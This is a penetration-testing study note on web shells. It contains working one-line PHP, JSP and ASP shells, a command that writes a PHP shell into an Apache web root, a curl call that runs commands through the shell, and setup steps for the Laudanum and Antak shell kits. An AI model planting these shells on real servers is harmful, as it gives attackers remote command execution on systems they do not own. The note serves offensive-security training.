---
id: Web Shell
aliases: []
tags:
  - Pentest/Shell/Web-Shell
---

# Web Shell

A [Web Shell](https://en.wikipedia.org/wiki/Web_shell)
is a shell-like interface that facilitates remote access
to a web server, commonly exploited for cyberattacks.
Unlike traditional shells, it is accessed via a web browser,
making it a versatile tool for malicious activities

A **Web Shell** accepts the command through
[[HTTP/General#HTTP Methods|HTTP request parameters]]
(*e.g. `GET`, `POST`*) and prints the output to the webpage

<!-- Example {{{-->
> [!example]
>
> PHP
>
> ```php
> <?php system($_REQUEST["cmd"]); ?>
> ```
>
> JSP
>
> ```jsp
> <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
> ```
>
> ASP
>
> ```asp
> <% eval request("cmd") %>
> ```
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> Web Shells must be written in the backend's programming language
> as they are running platform-specific functions
> to execute system commands
>
> 1. [[Execution Paths#Extension Enumeration|Enumerate]]
>    the extension of the `/index` page
>
> 2. Determine backend language using
>    [Wappalyzer](https://www.wappalyzer.com/)
>
<!-- }}} -->

___

<!-- General {{{-->
## General

<!-- Uploading Web Shell {{{-->
### Uploading Web Shell

The web shell should be placed into the remote host's
[[Web Server Root|web root directory location]]
(*through a vulnerability or upload feature*)
and executed through the web browser

<!-- Example {{{-->
> [!example]
>
> `bash` command to write a web shell
> to a Linux machine running [[Apache/General|Apache]]
>
> ```sh
> echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Access Web Shell {{{-->
### Access Web Shell

The web shell may be accessed via a web browser or via [[cURL]]

<!-- Tip {{{-->
> [!tip]
>
> A web shell would bypass any firewall restriction
> as it will not open a new connection on a port,
> but using `80`or `443`
>
<!-- }}} -->

```sh
curl http://<SERVER_IP>:<PORT>/shell.php?cmd=id
```

<!-- }}} -->

___
<!-- }}} -->


<!-- Web Shells {{{-->
## Web Shells

<!-- Laudanum {{{-->
### Laudanum

[Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
is a repository of ready-made files
that can be used to inject onto a victim
and receive back access via a reverse shell,
run commands on the victim host right from the browser,
and more

The **Laudanum** files can be found in
`/usr/share/laudanum`

```sh
ls -al /usr/share/laudanum
```

1. Copy a shell for modification

2. Modify the attacker IP & port

<!-- }}} -->

<!-- Antak {{{-->
### Antak

**Antak** is a web shell built with [ASP.Net](https://en.wikipedia.org/wiki/ASP.NET)
included within the [Nishang](https://github.com/samratashok/nishang)
project

```sh
sudo apt install nishang
```

**Antak** utilizes [[PowerShell/General|PowerShell]]
to interact with the host,
making it great for acquiring a web shell on a Windows server

The Antak files can be found in
`/usr/share/nishang/Antak-WebShell`

```sh
ls -al /usr/share/nishang/Antak-WebShell
```

1. Copy the shell for modification

```sh
cp /usr/share/nishang/Antak-WebShell/antak.aspx .
```

2. Set credentials for access on line `14`

```sh
vim antak.aspx
```

```sh
:14
```

<!-- }}} -->

<!-- PHP {{{-->
### PHP

<!-- Info {{{-->
> [!info]- Resources
>
> - [wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
> - [phpbash](https://github.com/Arrexel/phpbash)
> - [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells/PHP)
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
